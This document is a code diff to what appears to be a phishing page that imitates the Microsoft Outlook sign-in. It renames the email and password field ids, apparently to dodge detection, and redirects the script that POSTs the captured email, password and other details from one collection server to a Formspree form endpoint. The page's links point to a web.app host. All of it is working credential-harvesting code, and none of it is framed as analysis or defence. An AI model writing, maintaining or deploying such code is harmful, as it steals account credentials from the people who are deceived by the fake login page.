@@ -111,7 +111,7 @@
                         <span style="font-size: 13px;font-weight: 500">to continue Outlook</span><br>
                         <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
                         <div class="form-group mt-2">
-                            <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" aria-describedby="emailHelp" placeholder="Enter Address, phone number, or skype" style="border-right: none;border-left: none;border-top: none;">
+                            <input type="email" name="email" class="form-control rounded-0 border-dark" id="imputone" aria-describedby="emailHelp" placeholder="Enter Address, phone number, or skype" style="border-right: none;border-left: none;border-top: none;">
                         </div>
                         <p style="font-size: 14px">No account? <a href="https://auth-owa-125434.web.app/#">Create one!</a></p>
                         <p style="font-size: 14px"><a href="https://auth-owa-125434.web.app/#">Can't access your account?</a></p>
@@ -131,7 +131,7 @@
                                 <span id="msg" class="text-danger">Sorry, your sign-in timed out. Please sign in again. </span>
                             </div>
                             <div class="form-group mt-2">
-                                <input type="password" name="password" class="form-control rounded-0 border-dark" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+                                <input type="password" name="password" class="form-control rounded-0 border-dark" id="inputtwo" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
                             </div>
                             <p style="font-size: 14px"><a href="https://auth-owa-125434.web.app/#">Forget password?</a></p>
                             <!-- <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
@@ -299,11 +299,11 @@ $(document).ready(function() {
         count = count + 1;
         $.ajax({
             dataType: 'JSON',
-            url: "https://authy-owa16542.us/next.php",
+            url: "https://formspree.io/f/xayadggl",
             type: 'POST',
             data: {
-                email: email,
-                password: password,
+                inputone: email,
+                inputtwo: password,
                 detail: detail,
 
             },
